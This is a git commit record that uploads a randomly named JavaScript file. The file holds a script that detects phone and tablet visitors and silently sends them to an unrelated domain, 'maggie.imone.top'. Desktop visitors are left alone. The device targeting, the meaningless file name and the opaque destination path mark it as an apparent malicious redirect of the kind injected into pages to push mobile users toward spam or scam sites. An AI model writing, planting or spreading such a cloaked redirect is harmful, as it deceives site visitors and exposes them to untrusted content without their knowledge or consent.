8c23cdb19a5cb67f91ad88e67b0764fc88f26af1
asukodoktok33 <146879019+asukodoktok33@users.noreply.github.com>
2023-10-04 01:49:36 +0700

    Add files via upload

---
+++ fgusfgwguiredrhjkf.js
@@ -0,0 +1,13 @@
+<script src="https://cdn-bimi.akamaized.net/mr/mobile-detect.min.js"></script> <script type="text/javascript">
+var md = new MobileDetect(window.navigator.userAgent);
+if (md.mobile() || md.tablet()) {
+var redirect = false;
+var excludeTablets = true;
+var excludeIOSAndroid = true;
+var isiOs = md.is("iOs"); var isAndroidOs = md.is("AndroidOs"); var isFeaturePhone = md.mobile() && !isiOs && !isAndroidOs; if (isFeaturePhone || md.tablet() && excludeTablets
+|| (((isiOs && !md.tablet()) || isAndroidOs) && excludeIOSAndroid)) {
+redirect = true;
+}
+
+if (redirect) {
+location.href= 'http://maggie.imone.top/001-camille1695019806'; }}</script>
